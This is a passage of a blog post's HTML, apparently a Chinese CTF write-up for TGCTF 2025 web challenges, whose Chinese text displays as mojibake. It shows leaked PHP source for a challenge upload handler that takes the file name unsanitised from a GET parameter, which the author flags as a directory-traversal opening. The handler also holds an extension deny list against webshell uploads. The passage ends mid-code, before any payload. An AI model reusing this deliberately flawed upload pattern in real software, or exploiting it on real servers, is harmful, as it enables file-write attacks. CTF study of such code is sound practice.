<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TGCTF-2025-Web-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="Web
(ez)upload
hintå†™æœ‰æºç æ³„éœ²
index.php.bakæ‹¿æºç 
 1&lt;?php
 2define(&#39;UPLOAD_PATH&#39;, __DIR__ . &#39;/uploads/&#39;);
 3$is_upload = false;
 4$msg = null;
 5$status_code = 200; // é»˜è®¤çŠ¶æ€ç ä¸º 200
 6if (isset($_POST[&#39;submit&#39;])) {
 7    if (file_exists(UPLOAD_PATH)) {
 8        $deny_ext = array(&#34;php&#34;, &#34;php5&#34;, &#34;php4&#34;, &#34;php3&#34;, &#34;php2&#34;, &#34;html&#34;, &#34;htm&#34;, &#34;phtml&#34;, &#34;pht&#34;, &#34;jsp&#34;, &#34;jspa&#34;, &#34;jspx&#34;, &#34;jsw&#34;, &#34;jsv&#34;, &#34;jspf&#34;, &#34;jtml&#34;, &#34;asp&#34;, &#34;aspx&#34;, &#34;asa&#34;, &#34;asax&#34;, &#34;ascx&#34;, &#34;ashx&#34;, &#34;asmx&#34;, &#34;cer&#34;, &#34;swf&#34;, &#34;htaccess&#34;);
 9
10        if (isset($_GET[&#39;name&#39;])) {
11            $file_name = $_GET[&#39;name&#39;];
12        } else {
13            $file_name = basename($_FILES[&#39;name&#39;][&#39;name&#39;]);
14        }
15        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
16
17        if (!in_array($file_ext, $deny_ext)) {
18            $temp_file = $_FILES[&#39;name&#39;][&#39;tmp_name&#39;];
19            $file_content = file_get_contents($temp_file);
20
21            if (preg_match(&#39;/.&#43;?&lt;/s&#39;, $file_content)) {
22                $msg = &#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#39;;
23                $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—®
24            } else {
25                $img_path = UPLOAD_PATH . $file_name;
26                if (move_uploaded_file($temp_file, $img_path)) {
27                    $is_upload = true;
28                    $msg = &#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#39;;
29                } else {
30                    $msg = &#39;ä¸Šä¼ å‡ºé”™ï¼&#39;;
31                    $status_code = 500; // 500 è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯
32                }
33            }
34        } else {
35            $msg = &#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#39;;
36            $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—®
37        }
38    } else {
39        $msg = UPLOAD_PATH . &#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;;
40        $status_code = 404; // 404 è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ°
41    }
42}
43
44// è®¾ç½® HTTP çŠ¶æ€ç 
45http_response_code($status_code);
46
47// è¾“å‡ºç»“æœ
48echo json_encode([
49    &#39;status_code&#39; =&gt; $status_code,
50    &#39;msg&#39; =&gt; $msg,
51]);
å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªnameï¼Œå¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼Œæƒ³åˆ°ç›®å½•ç©¿è¶Š">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/tgctf_2025/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.e624e7dff45bacc4142784fe89280441dd4670102d43590c5171410d3d0b1877.css" integrity="sha256-5iTn3/RbrMQUJ4T&#43;iSgEQd1GcBAtQ1kMUXFBDT0LGHc=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/tgctf_2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/tgctf_2025/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="TGCTF-2025-Web-Writeup">
  <meta property="og:description" content="Web (ez)upload hintå†™æœ‰æºç æ³„éœ²
index.php.bakæ‹¿æºç 
1&lt;?php 2define(&#39;UPLOAD_PATH&#39;, __DIR__ . &#39;/uploads/&#39;); 3$is_upload = false; 4$msg = null; 5$status_code = 200; // é»˜è®¤çŠ¶æ€ç ä¸º 200 6if (isset($_POST[&#39;submit&#39;])) { 7 if (file_exists(UPLOAD_PATH)) { 8 $deny_ext = array(&#34;php&#34;, &#34;php5&#34;, &#34;php4&#34;, &#34;php3&#34;, &#34;php2&#34;, &#34;html&#34;, &#34;htm&#34;, &#34;phtml&#34;, &#34;pht&#34;, &#34;jsp&#34;, &#34;jspa&#34;, &#34;jspx&#34;, &#34;jsw&#34;, &#34;jsv&#34;, &#34;jspf&#34;, &#34;jtml&#34;, &#34;asp&#34;, &#34;aspx&#34;, &#34;asa&#34;, &#34;asax&#34;, &#34;ascx&#34;, &#34;ashx&#34;, &#34;asmx&#34;, &#34;cer&#34;, &#34;swf&#34;, &#34;htaccess&#34;); 9 10 if (isset($_GET[&#39;name&#39;])) { 11 $file_name = $_GET[&#39;name&#39;]; 12 } else { 13 $file_name = basename($_FILES[&#39;name&#39;][&#39;name&#39;]); 14 } 15 $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 16 17 if (!in_array($file_ext, $deny_ext)) { 18 $temp_file = $_FILES[&#39;name&#39;][&#39;tmp_name&#39;]; 19 $file_content = file_get_contents($temp_file); 20 21 if (preg_match(&#39;/.&#43;?&lt;/s&#39;, $file_content)) { 22 $msg = &#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#39;; 23 $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—® 24 } else { 25 $img_path = UPLOAD_PATH . $file_name; 26 if (move_uploaded_file($temp_file, $img_path)) { 27 $is_upload = true; 28 $msg = &#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#39;; 29 } else { 30 $msg = &#39;ä¸Šä¼ å‡ºé”™ï¼&#39;; 31 $status_code = 500; // 500 è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ 32 } 33 } 34 } else { 35 $msg = &#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#39;; 36 $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—® 37 } 38 } else { 39 $msg = UPLOAD_PATH . &#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;; 40 $status_code = 404; // 404 è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ° 41 } 42} 43 44// è®¾ç½® HTTP çŠ¶æ€ç  45http_response_code($status_code); 46 47// è¾“å‡ºç»“æœ 48echo json_encode([ 49 &#39;status_code&#39; =&gt; $status_code, 50 &#39;msg&#39; =&gt; $msg, 51]); å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªnameï¼Œå¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼Œæƒ³åˆ°ç›®å½•ç©¿è¶Š">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-04-18T00:27:55+08:00">
    <meta property="article:modified_time" content="2025-04-18T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="TGCTF-2025-Web-Writeup">
<meta name="twitter:description" content="Web
(ez)upload
hintå†™æœ‰æºç æ³„éœ²
index.php.bakæ‹¿æºç 
 1&lt;?php
 2define(&#39;UPLOAD_PATH&#39;, __DIR__ . &#39;/uploads/&#39;);
 3$is_upload = false;
 4$msg = null;
 5$status_code = 200; // é»˜è®¤çŠ¶æ€ç ä¸º 200
 6if (isset($_POST[&#39;submit&#39;])) {
 7    if (file_exists(UPLOAD_PATH)) {
 8        $deny_ext = array(&#34;php&#34;, &#34;php5&#34;, &#34;php4&#34;, &#34;php3&#34;, &#34;php2&#34;, &#34;html&#34;, &#34;htm&#34;, &#34;phtml&#34;, &#34;pht&#34;, &#34;jsp&#34;, &#34;jspa&#34;, &#34;jspx&#34;, &#34;jsw&#34;, &#34;jsv&#34;, &#34;jspf&#34;, &#34;jtml&#34;, &#34;asp&#34;, &#34;aspx&#34;, &#34;asa&#34;, &#34;asax&#34;, &#34;ascx&#34;, &#34;ashx&#34;, &#34;asmx&#34;, &#34;cer&#34;, &#34;swf&#34;, &#34;htaccess&#34;);
 9
10        if (isset($_GET[&#39;name&#39;])) {
11            $file_name = $_GET[&#39;name&#39;];
12        } else {
13            $file_name = basename($_FILES[&#39;name&#39;][&#39;name&#39;]);
14        }
15        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
16
17        if (!in_array($file_ext, $deny_ext)) {
18            $temp_file = $_FILES[&#39;name&#39;][&#39;tmp_name&#39;];
19            $file_content = file_get_contents($temp_file);
20
21            if (preg_match(&#39;/.&#43;?&lt;/s&#39;, $file_content)) {
22                $msg = &#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#39;;
23                $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—®
24            } else {
25                $img_path = UPLOAD_PATH . $file_name;
26                if (move_uploaded_file($temp_file, $img_path)) {
27                    $is_upload = true;
28                    $msg = &#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#39;;
29                } else {
30                    $msg = &#39;ä¸Šä¼ å‡ºé”™ï¼&#39;;
31                    $status_code = 500; // 500 è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯
32                }
33            }
34        } else {
35            $msg = &#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#39;;
36            $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—®
37        }
38    } else {
39        $msg = UPLOAD_PATH . &#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;;
40        $status_code = 404; // 404 è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ°
41    }
42}
43
44// è®¾ç½® HTTP çŠ¶æ€ç 
45http_response_code($status_code);
46
47// è¾“å‡ºç»“æœ
48echo json_encode([
49    &#39;status_code&#39; =&gt; $status_code,
50    &#39;msg&#39; =&gt; $msg,
51]);
å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªnameï¼Œå¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼Œæƒ³åˆ°ç›®å½•ç©¿è¶Š">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "TGCTF-2025-Web-Writeup",
      "item": "http://localhost:1313/post/tgctf_2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TGCTF-2025-Web-Writeup",
  "name": "TGCTF-2025-Web-Writeup",
  "description": "Web (ez)upload hintå†™æœ‰æºç æ³„éœ²\nindex.php.bakæ‹¿æºç \n1\u0026lt;?php 2define(\u0026#39;UPLOAD_PATH\u0026#39;, __DIR__ . \u0026#39;/uploads/\u0026#39;); 3$is_upload = false; 4$msg = null; 5$status_code = 200; // é»˜è®¤çŠ¶æ€ç ä¸º 200 6if (isset($_POST[\u0026#39;submit\u0026#39;])) { 7 if (file_exists(UPLOAD_PATH)) { 8 $deny_ext = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;php2\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;htm\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;); 9 10 if (isset($_GET[\u0026#39;name\u0026#39;])) { 11 $file_name = $_GET[\u0026#39;name\u0026#39;]; 12 } else { 13 $file_name = basename($_FILES[\u0026#39;name\u0026#39;][\u0026#39;name\u0026#39;]); 14 } 15 $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 16 17 if (!in_array($file_ext, $deny_ext)) { 18 $temp_file = $_FILES[\u0026#39;name\u0026#39;][\u0026#39;tmp_name\u0026#39;]; 19 $file_content = file_get_contents($temp_file); 20 21 if (preg_match(\u0026#39;/.+?\u0026lt;/s\u0026#39;, $file_content)) { 22 $msg = \u0026#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼\u0026#39;; 23 $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—® 24 } else { 25 $img_path = UPLOAD_PATH . $file_name; 26 if (move_uploaded_file($temp_file, $img_path)) { 27 $is_upload = true; 28 $msg = \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\u0026#39;; 29 } else { 30 $msg = \u0026#39;ä¸Šä¼ å‡ºé”™ï¼\u0026#39;; 31 $status_code = 500; // 500 è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ 32 } 33 } 34 } else { 35 $msg = \u0026#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼\u0026#39;; 36 $status_code = 403; // 403 è¡¨ç¤ºç¦æ­¢è®¿é—® 37 } 38 } else { 39 $msg = UPLOAD_PATH . \u0026#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼\u0026#39;; 40 $status_code = 404; // 404 è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ° 41 } 42} 43 44// è®¾ç½® HTTP çŠ¶æ€ç  45http_response_code($status_code); 46 47// è¾“å‡ºç»“æœ 48echo json_encode([ 49 \u0026#39;status_code\u0026#39; =\u0026gt; $status_code, 50 \u0026#39;msg\u0026#39; =\u0026gt; $msg, 51]); å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªnameï¼Œå¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼Œæƒ³åˆ°ç›®å½•ç©¿è¶Š\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "Web (ez)upload hintå†™æœ‰æºç æ³„éœ²\nindex.php.bakæ‹¿æºç \n1\u003c?php 2define('UPLOAD_PATH', __DIR__ . '/uploads/'); 3$is_upload = false; 4$msg = null; 5$status_code = 200; // é»˜è®¤çŠ¶æ€ç ä¸º 200 6if (isset($_POST['submit'])) { 7 if (file_exists(UPLOAD_PATH)) { 8 $deny_ext = array(\"php\", \"php5\", \"php4\", \"php3\", \"php2\", \"html\", \"htm\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\"); 9 10 if (isset($_GET['name'])) { 11 $file_name = $_GET['name']; 12 } else { 13 $file_name = basename($_FILES['name']['name']); 14 } 15 $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 16 17 if (!in_array($file_ext, $deny_ext)) { 18 $temp_file = $_FILES['name']['tmp_name']; 19 $file_content = file_get_contents($temp_file); 20 21 if (preg_match('/.+?",
  "wordCount" : "3198",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-04-18T00:27:55+08:00",
  "dateModified": "2025-04-18T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/tgctf_2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µğŸ“”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£ğŸ—ƒï¸</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾ğŸ”–</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢ğŸ”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="å‹é“¾ğŸˆ">
                    <span>å‹é“¾ğŸˆ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äºğŸ‘¨â€ğŸ’»</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      TGCTF-2025-Web-Writeup
    </h1>
<div class="post-meta"><span title='2025-04-18 00:27:55 +0800 CST'>2025-04-18</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;Xrntkk

<div class="meta-item">&nbspÂ·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#web" aria-label="Web">Web</a><ul>
                        
                <li>
                    <a href="#ezupload" aria-label="(ez)upload">(ez)upload</a></li>
                <li>
                    <a href="#aaa%e5%81%b7%e6%b8%a1%e9%98%b4%e5%b9%b3" aria-label="AAAå·æ¸¡é˜´å¹³">AAAå·æ¸¡é˜´å¹³</a></li>
                <li>
                    <a href="#aaa%e5%81%b7%e6%b8%a1%e9%98%b4%e5%b9%b3%e5%a4%8d%e4%bb%87" aria-label="AAAå·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰">AAAå·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰</a></li>
                <li>
                    <a href="#%e7%86%9f%e6%82%89%e7%9a%84%e9%85%8d%e6%96%b9%e7%86%9f%e6%82%89%e7%9a%84%e5%91%b3%e9%81%93" aria-label="ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“">ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“</a></li>
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ">ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</a></li>
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e5%a4%8d%e4%bb%87" aria-label="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼ˆå¤ä»‡ï¼‰">ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼ˆå¤ä»‡ï¼‰</a></li>
                <li>
                    <a href="#%e5%89%8d%e7%ab%afgame" aria-label="å‰ç«¯GAME">å‰ç«¯GAME</a></li>
                <li>
                    <a href="#%e5%89%8d%e7%ab%afgame-plus" aria-label="å‰ç«¯GAME Plus">å‰ç«¯GAME Plus</a></li>
                <li>
                    <a href="#%e5%89%8d%e7%ab%afgame-ultra" aria-label="å‰ç«¯GAME Ultra">å‰ç«¯GAME Ultra</a></li>
                <li>
                    <a href="#tg_" aria-label="TG_wordpress">TG_wordpress</a></li>
                <li>
                    <a href="#%e7%81%ab%e7%9c%bc%e8%be%a9%e9%ad%91%e9%ad%85" aria-label="ç«çœ¼è¾©é­‘é­…">ç«çœ¼è¾©é­‘é­…</a></li>
                <li>
                    <a href="#%e7%9b%b4%e9%9d%a2%e5%a4%a9%e5%91%bd" aria-label="ç›´é¢å¤©å‘½">ç›´é¢å¤©å‘½</a></li>
                <li>
                    <a href="#%e7%9b%b4%e9%9d%a2%e5%a4%a9%e5%91%bd%e5%a4%8d%e4%bb%87" aria-label="ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰">ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</a></li>
                <li>
                    <a href="#tgctf-2025-%e5%90%8e%e5%8f%b0%e7%ae%a1%e7%90%86" aria-label="TGCTF 2025 åå°ç®¡ç†">TGCTF 2025 åå°ç®¡ç†</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="ezupload"><strong>(ez)upload</strong><a hidden class="anchor" aria-hidden="true" href="#ezupload">#</a></h3>
<p>hintå†™æœ‰æºç æ³„éœ²</p>
<p>index.php.bakæ‹¿æºç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">define<span class="o">(</span><span class="s1">&#39;UPLOAD_PATH&#39;</span>, __DIR__ . <span class="s1">&#39;/uploads/&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> false<span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> null<span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$status_code</span> <span class="o">=</span> 200<span class="p">;</span> // é»˜è®¤çŠ¶æ€ç ä¸º <span class="m">200</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;submit&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="o">(</span>file_exists<span class="o">(</span>UPLOAD_PATH<span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">&#34;php&#34;</span>, <span class="s2">&#34;php5&#34;</span>, <span class="s2">&#34;php4&#34;</span>, <span class="s2">&#34;php3&#34;</span>, <span class="s2">&#34;php2&#34;</span>, <span class="s2">&#34;html&#34;</span>, <span class="s2">&#34;htm&#34;</span>, <span class="s2">&#34;phtml&#34;</span>, <span class="s2">&#34;pht&#34;</span>, <span class="s2">&#34;jsp&#34;</span>, <span class="s2">&#34;jspa&#34;</span>, <span class="s2">&#34;jspx&#34;</span>, <span class="s2">&#34;jsw&#34;</span>, <span class="s2">&#34;jsv&#34;</span>, <span class="s2">&#34;jspf&#34;</span>, <span class="s2">&#34;jtml&#34;</span>, <span class="s2">&#34;asp&#34;</span>, <span class="s2">&#34;aspx&#34;</span>, <span class="s2">&#34;asa&#34;</span>, <span class="s2">&#34;asax&#34;</span>, <span class="s2">&#34;ascx&#34;</span>, <span class="s2">&#34;ashx&#34;</span>, <span class="s2">&#34;asmx&#34;</span>, <span class="s2">&#34;cer&#34;</span>, <span class="s2">&#34;swf&#34;</span>, <span class="s2">&#34;htaccess&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;name&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;name&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;name&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> pathinfo<span class="o">(</span><span class="nv">$file_name</span>, PATHINFO_EXTENSION<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">if</span> <span class="o">(</span>!in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$deny_ext</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;name&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="nv">$file_content</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$temp_file</span><span class="o">)</span><span class="p">;</span>
